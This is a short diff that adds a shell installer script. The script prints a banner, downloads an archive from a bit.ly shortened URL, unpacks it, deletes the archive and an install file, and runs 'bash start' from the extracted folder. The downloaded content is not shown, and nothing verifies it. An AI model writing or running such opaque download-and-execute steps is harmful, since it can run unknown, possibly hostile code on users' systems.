@@ -1,0 +1,10 @@
+echo "v1.9" | lolcat
+echo " Authors Unknown240 "
+echo " "
+
+
+wget https://bit.ly/30Qecjo
+7z x 30Qecjo
+rm -rf 30Qecjo
+rm -rf install
+cd v1.9 && bash start
